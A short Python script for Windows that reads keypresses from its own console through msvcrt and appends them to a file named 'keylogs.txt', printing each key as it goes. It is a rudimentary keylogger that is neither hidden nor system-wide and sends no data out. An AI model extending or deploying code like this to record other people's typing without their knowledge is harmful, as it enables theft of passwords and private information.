import msvcrt
def on_press():
    try:
        while True:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                k = key.decode('utf-8')
                if k == '\r':
                    k = '[ENTER]'
                elif k == '\x08':
                    k = '[BACKSPACE]'
                elif k == ' ': 
                    k = ' '
                else:
                    k = f'[{k.upper()}]' if ord(k) < 32 or ord(k) > 126 else k
                with open('keylogs.txt', 'a') as log_file:
                    log_file.write(k)
                print(f'Key pressed: {k}')
    except Exception as e:
        print(f'Error writing to file: {e}')
on_press()
